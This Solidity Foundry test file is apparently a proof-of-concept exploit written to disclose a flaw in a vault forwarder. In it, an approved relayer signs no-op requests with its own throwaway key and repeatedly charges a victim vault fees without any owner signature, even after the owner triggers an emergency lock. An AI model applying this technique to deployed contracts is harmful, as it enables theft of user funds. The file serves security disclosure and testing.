// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.34;

import {ASSET_STABLE_COIN, CFG_OWNER} from "guard-contracts/src/interfaces/IBittyV1Guard.sol";
import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC2771Forwarder} from "openzeppelin-contracts/contracts/metatx/ERC2771Forwarder.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {MockGuard} from "../../test/helpers/MockGuard.sol";
import {BittyV1VaultDeFiFacet} from "../../src/BittyV1VaultDeFiFacet.sol";
import {BittyV1Vault} from "../../src/BittyV1Vault.sol";
import {BittyV1VaultForwarder} from "../../src/BittyV1VaultForwarder.sol";
import {BITTY_GUARD, BITTY_FORWARDER, BITTY_FEE_COLLECTOR} from "../../src/logic/Constants.sol";

contract RelayerChargePoC is Test {
    BittyV1VaultForwarder fwd;
    BittyV1Vault vault;
    MockGuard guard;
    MockERC20 usdc;
    uint256 ownerPk = 0xA11CE;
    address owner;
    address relayer = makeAddr("relayer");

    function setUp() public {
        owner = vm.addr(ownerPk);
        vm.etch(BITTY_GUARD, address(new MockGuard()).code);
        guard = MockGuard(BITTY_GUARD);
        guard.setConfigAddress(CFG_OWNER, makeAddr("fwdOwner"));
        vm.etch(BITTY_FORWARDER, address(new BittyV1VaultForwarder()).code);
        fwd = BittyV1VaultForwarder(payable(BITTY_FORWARDER));
        vm.prank(makeAddr("fwdOwner"));
        fwd.setRelayerApproval(relayer, true);
        BittyV1Vault impl = new BittyV1Vault(address(new BittyV1VaultDeFiFacet()));
        bytes memory init = abi.encodeCall(BittyV1Vault.initialize, (owner, makeAddr("weth"), false, address(0), 0, new bytes[](0)));
        vault = BittyV1Vault(payable(new ERC1967Proxy(address(impl), init)));
        usdc = new MockERC20("USD Coin", "USDC", 6);
        guard.setAsset(address(usdc), ASSET_STABLE_COIN);
        usdc.mint(address(vault), 10_000e6);
    }

    function _sign(ERC2771Forwarder.ForwardRequestData memory r, uint256 pk) internal view returns (ERC2771Forwarder.ForwardRequestData memory) {
        bytes32 typeHash = keccak256("ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)");
        bytes32 structHash = keccak256(abi.encode(typeHash, r.from, r.to, r.value, r.gas, fwd.nonceFor(r.from, r.to), r.deadline, keccak256(r.data)));
        bytes32 domain = keccak256(abi.encode(keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("BittyV1VaultForwarder"), keccak256("1"), block.chainid, address(fwd)));
        (uint8 v, bytes32 rr, bytes32 ss) = vm.sign(pk, keccak256(abi.encodePacked("\x19\x01", domain, structHash)));
        r.signature = abi.encodePacked(rr, ss, v);
        return r;
    }

    function _charge(address junk, uint256 junkPk) internal {
        ERC2771Forwarder.ForwardRequestData memory r = ERC2771Forwarder.ForwardRequestData({
            from: junk, to: address(vault), value: 0, gas: 200_000,
            deadline: uint48(vm.getBlockTimestamp() + 600),
            data: abi.encodeWithSignature("settleOwnershipTransfer()"), signature: ""});
        r = _sign(r, junkPk);
        vm.prank(relayer);
        fwd.executeWithFee(r, address(usdc), 100e6);
    }

    /// The relayer signs a no-op request with ITS OWN throwaway key and charges the victim vault the full budget.
    function test_relayerChargesVaultWithoutOwnerSignature() public {
        (address junk, uint256 junkPk) = makeAddrAndKey("junk");
        // owner panics and engages emergency lock: charging still works
        vm.prank(owner);
        vault.emergencyLock();
        uint256 t0 = 1_700_000_000;
        for (uint256 day = 0; day < 3; day++) {
            vm.warp(t0 + day * 86400);
            _charge(junk, junkPk);
        }
        assertEq(usdc.balanceOf(BITTY_FEE_COLLECTOR), 300e6, "vault charged with no owner request at all");
    }
}
